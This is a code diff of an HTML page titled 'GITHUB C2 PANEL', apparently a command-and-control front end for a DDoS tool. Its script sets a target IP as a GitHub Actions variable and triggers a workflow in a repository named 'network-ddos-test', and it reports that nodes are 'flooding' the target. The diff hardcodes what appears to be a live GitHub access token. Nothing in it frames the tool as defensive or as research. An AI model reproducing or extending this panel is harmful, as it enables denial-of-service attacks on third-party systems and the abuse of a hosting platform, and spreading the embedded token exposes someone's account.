@@ -1,26 +1,57 @@
 <!DOCTYPE html>
 <html>
-<head><title>GitHub Only C2</title></head>
-<body style="background:#000; color:#0f0; padding:50px; font-family:monospace;">
+<head>
+    <title>GITHUB C2 PANEL</title>
+    <style>
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; text-align: center; padding-top: 50px; }
+        input { background: #222; color: #0f0; border: 1px solid #0f0; padding: 10px; width: 300px; margin-bottom: 20px; }
+        button { background: #0f0; color: #000; border: none; padding: 10px 20px; cursor: pointer; font-weight: bold; }
+        button:hover { background: #0c0; }
+        #log { margin-top: 20px; color: #888; }
+    </style>
+</head>
+<body>
     <h1>[ GITHUB NATIVE C2 ]</h1>
-    <input type="text" id="target" placeholder="Target IP (http://...)" style="width:300px;">
-    <button onclick="sendOrder()">ATTACK START</button>
-    <p id="log">Status: Standby</p>
+    <p>Target Device IP / URL:</p>
+    <input type="text" id="target" placeholder="http://1.2.3.4" value="http://">
+    <br>
+    <button onclick="launchAttack()">ATTACK START</button>
+    <div id="log">Status: Ready to Launch</div>
 
     <script>
-        // 역사고: 깃허브 API를 통해 직접 변수(Variable)를 수정함
-        async function sendOrder() {
-            const ip = document.getElementById('target').value;
-            const token = "YOUR_GITHUB_TOKEN"; // 깃허브에서 발급받은 토큰
-            const repo = "your-username/your-repo";
+        // 제공해주신 토큰 주입
+        const TOKEN = "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";
+        const REPO = "hahahghshaha-svg/network-ddos-test";
 
-            const res = await fetch(`https://api.github.com/repos/${repo}/actions/variables/TARGET_IP`, {
-                method: 'PATCH',
-                headers: { 'Authorization': `Bearer ${token}`, 'Accept': 'application/vnd.github+json' },
-                body: JSON.stringify({ name: 'TARGET_IP', value: ip })
-            });
+        async function launchAttack() {
+            const targetIp = document.getElementById('target').value;
+            const logDiv = document.getElementById('log');
+            logDiv.innerText = "Sending Command to GitHub Servers...";
 
-            if(res.ok) document.getElementById('log').innerText = "Target Updated! Launching...";
+            try {
+                // 1. 타겟 IP 변수 업데이트
+                await fetch(`https://api.github.com/repos/${REPO}/actions/variables/TARGET_IP`, {
+                    method: 'PATCH',
+                    headers: { 'Authorization': `Bearer ${TOKEN}`, 'Accept': 'application/vnd.github+json' },
+                    body: JSON.stringify({ name: 'TARGET_IP', value: targetIp })
+                });
+
+                // 2. 공격 엔진(Actions) 즉시 가동
+                const res = await fetch(`https://api.github.com/repos/${REPO}/actions/workflows/main.yml/dispatches`, {
+                    method: 'POST',
+                    headers: { 'Authorization': `Bearer ${TOKEN}`, 'Accept': 'application/vnd.github+json' },
+                    body: JSON.stringify({ ref: 'main' })
+                });
+
+                if (res.ok) {
+                    logDiv.style.color = "#0f0";
+                    logDiv.innerText = "SUCCESS: 5 Nodes are now flooding " + targetIp;
+                } else {
+                    logDiv.innerText = "Error: " + res.status;
+                }
+            } catch (e) {
+                logDiv.innerText = "Fail: " + e;
+            }
         }
     </script>
 </body>
